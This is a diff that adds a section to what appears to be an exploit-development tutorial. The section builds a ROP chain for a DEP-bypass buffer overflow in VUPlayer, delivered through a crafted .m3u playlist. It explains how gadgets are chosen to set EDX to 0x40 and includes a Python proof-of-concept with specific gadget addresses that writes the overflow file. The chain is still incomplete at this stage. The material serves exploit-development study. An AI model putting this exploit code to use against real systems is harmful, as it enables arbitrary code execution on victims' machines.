@@ -322,3 +322,75 @@ ECX crushed, moving onto the next goal!
 
 ## EDX ROP Chain
 This is the first fun one, how do we get EDX to hold the value `0x40`? After sifting through a bunch of gadgets, I couldn't really find a good series of gadgets to directly influence EDX in an efficient manner. When this happens, I often start looking at ways to manipulate other registers and then somehow move that value into EDX. 
+
+I started looking at EAX. First, is there a way to cleanly get the EAX value into EDX? Why yes there is, an extremely clean way! I found this gadget `# XCHG EAX,EDX # RETN` at `0x10038a6c`. So if we can manipulate EAX into holding `0x40` we have a gadget in our pocket to get that value into EDX. 
+
+So I started looking at ways to clear EAX. I want EAX to always start zeroed out so that I know the code is reliable. The first thing I searched for ended up hitting, an `# XOR EAX,EAX # RETN` gadget located at `0x106074f8`. This is great, this will zero out the EAX register. 
+
+Now, I need a way to add to the EAX register. A trick from the FuzzySecurity blog is to set the register at `0xffffffff` with a simple `POP` like we've been doing and then increment it until it reaches the value of `0x2`. Then we could add it against itself with `ADD EAX,EAX` instruction, essentially doubling the register until it reaches `64` decimcal (`0x40` in hex); however, there is no `ADD EAX,EAX` gadget in our modules, womp womp. 
+
+BUT, there is a really cool and clean `# ADD EAX,4 # RETN` gadget! We can just throw this gadget on the stack over and over until EAX holds `0x40`. 
+
+So to wrap up we're going to:
++ zero out EAX
++ add 4 to EAX until it reaches `0x40`
++ swap values between EAX and EDX so that EDX holds our goal value
+
+Let's update our POC with our new gadget chain:
+```python
+import sys
+import struct
+import os
+
+crash_file = "vuplayer-dep.m3u"
+
+# GOALS
+# EAX 90909090 => Nop {COMPLETED}                                                
+# ECX <writeable pointer> => lpflOldProtect {COMPLETED}                                 
+# EDX 00000040 => flNewProtect                             
+# EBX 00000201 => dwSize                                            
+# ESP ???????? => Leave as is                                         
+# EBP ???????? => Call to ESP (jmp, call, push,..)                
+# ESI ???????? => PTR to VirtualProtect - DWORD PTR of 0x1060E25C
+# EDI 10101008 => ROP-Nop same as EIP
+
+# EAX Chunk Affects: EAX
+eax = struct.pack('<L', 0x10015fe7) # a pointer to # POP EAX # RETN
+eax += struct.pack('<L', 0x90909090)
+
+# ECX Chunk Affects: ECX
+ecx = struct.pack('<L', 0x10601007) # a pointer to # POP ECX # RETN
+ecx += struct.pack('<L', 0x101053DC)    # found a spot in the RWX space of BASSWMA.dll for our writable pointer
+
+# EDX Chunk Affects: EAX, EDX
+edx = struct.pack('<L', 0x106074f8) # a pointer to # XOR EAX,EAX # RETN
+edx += struct.pack('<L', 0x10014474)    # a pointer to # ADD EAX,4 # RETN
+edx += struct.pack('<L', 0x10014474)    # a pointer to # ADD EAX,4 # RETN
+edx += struct.pack('<L', 0x10014474)    # a pointer to # ADD EAX,4 # RETN
+edx += struct.pack('<L', 0x10014474)    # a pointer to # ADD EAX,4 # RETN
+edx += struct.pack('<L', 0x10014474)    # a pointer to # ADD EAX,4 # RETN
+edx += struct.pack('<L', 0x10014474)    # a pointer to # ADD EAX,4 # RETN
+edx += struct.pack('<L', 0x10014474)    # a pointer to # ADD EAX,4 # RETN
+edx += struct.pack('<L', 0x10014474)    # a pointer to # ADD EAX,4 # RETN
+edx += struct.pack('<L', 0x10014474)    # a pointer to # ADD EAX,4 # RETN
+edx += struct.pack('<L', 0x10014474)    # a pointer to # ADD EAX,4 # RETN
+edx += struct.pack('<L', 0x10014474)    # a pointer to # ADD EAX,4 # RETN
+edx += struct.pack('<L', 0x10014474)    # a pointer to # ADD EAX,4 # RETN
+edx += struct.pack('<L', 0x10014474)    # a pointer to # ADD EAX,4 # RETN
+edx += struct.pack('<L', 0x10014474)    # a pointer to # ADD EAX,4 # RETN
+edx += struct.pack('<L', 0x10014474)    # a pointer to # ADD EAX,4 # RETN
+edx += struct.pack('<L', 0x10014474)    # a pointer to # ADD EAX,4 # RETN
+edx += struct.pack('<L', 0x10038a6c)    # a pointer to # XCHG EAX,EDX # RETN
+
+rop = ""
+
+fuzz = "A" * 1012
+fuzz += "\x08\x10\x10\x10" # 10101008  <-- Pointer to a RETN
+fuzz += rop
+fuzz += "C" * (3000 - len(fuzz))
+
+makedafile = open(crash_file, "w")
+makedafile.write(fuzz)
+makedafile.close()
+```
+
